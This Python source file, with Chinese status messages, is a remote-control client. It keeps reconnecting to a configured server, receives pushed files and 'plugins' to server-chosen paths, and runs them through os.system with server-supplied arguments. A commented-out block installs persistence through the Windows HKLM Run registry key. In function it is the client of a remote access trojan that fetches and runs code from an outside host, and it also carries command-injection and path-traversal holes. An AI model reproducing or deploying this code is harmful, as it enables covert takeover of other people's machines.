import socket,time,base64,json,os

# import win32api,win32con,sys
#
# name='remote_control_client'
# if hasattr(sys, 'frozen'):
#     path=os.path.abspath(sys.executable)
#     KeyName='Software\Microsoft\Windows\CurrentVersion\Run'
#     key=win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,KeyName,0,win32con.KEY_ALL_ACCESS)
#     win32api.RegSetValueEx(key,name,0,win32con.REG_SZ,path)
#     win32api.RegCloseKey(key)
# else:
#     path=os.path.abspath(__file__)
# print(path)

with open('./client_configs/plugin_parser.json','r',encoding='utf-8') as f:
    plugin_parser=json.load(f)
with open('./client_configs/config.json','r',encoding='utf-8') as f:
    config=json.load(f)

class ControlClient():
    def __init__(self,host,port):
        self.host=host
        self.port=port
        self.SOCKET=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.id=''
    def recvFile(self):
        print('等待发送文件头...')
        header=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
        print(header)
        print('接收到文件头！')

        if header['type']=='PLUGIN':
            if not os.path.exists('./plugins'):
                os.mkdir('./plugins')
            f=open(f'./plugins/{header["name"]}.{header["ex"]}','wb')
        elif header['type']=='FILE':
            if not os.path.exists(header['dst_dir']):
                os.mkdir(header['dst_dir'])
            f=open(f'{header["dst_dir"]}/{header["name"]}.{header["ex"]}','wb')
        else:
            f=open(f'{header["name"]}.{header["ex"]}','wb')

        print('开始接收文件...')
        recv_size=0
        while recv_size<header['size']:
            data=self.SOCKET.recv((1024**2)*16)
            print(len(data))
            recv_size+=len(data)
            f.write(data)
        f.close()
        print('文件接收完成')
    def handleCommand(self,command,args):
        print(command)
        try:
            if command=='sendPlugin':
                if (len(args)>1 and args[args.index('-t')+1]==self.id) or len(args)==1:
                    print('指令为接收一个插件')
                    self.recvFile()
            elif command=='runPlugin':
                if len(args)>1 and args[args.index('-t')+1]==self.id:
                    t=args.index('-t')+2
                    os.system(".\plugins\%s %s"%(plugin_parser[args[t]]['dir'],''.join(args[t+1:])))
                elif len(args)==1:
                    os.system(".\plugins\%s %s"%(plugin_parser[args[0]]['dir'],''.join(args[1:])))
            feedback={'status':'SUCCESS'}
        except Exception as err:
            feedback={'status':'FAILED','error':str(err)}
        print(feedback)
        message=base64.b64encode(json.dumps(feedback).encode(encoding='utf-8'))
        self.SOCKET.sendall(message)

    def connect(self):
        while True:
            self.SOCKET=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                print('正在连接中...')
                while True:
                    try:
                        self.SOCKET.connect((self.host,self.port))
                        print('连接成功！等待服务端响应...')
                        break
                    except Exception as err:
                        pass

                request={'connection_type':'MAIN_CLIENT','client_name':'T1'}
                message=base64.b64encode(json.dumps(request).encode(encoding='utf-8'))
                self.SOCKET.sendall(message)
                feedback=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
                if feedback['status']=='Successfully Connected':
                    print('服务端响应完成！')
                    self.id=feedback['id']
                    print(self.id)
                    while True:
                        t=json.loads(base64.b64decode(self.SOCKET.recv(1024)).decode(encoding='utf-8'))
                        command=t['command']
                        args=t['args']
                        self.handleCommand(command,args)
            except Exception as err:
                if '[WinError 10054]' in str(err):
                    print('连接断开，开始重新连接')

if __name__ == '__main__':
    client=ControlClient(config['host'],config['port'])
    client.connect()
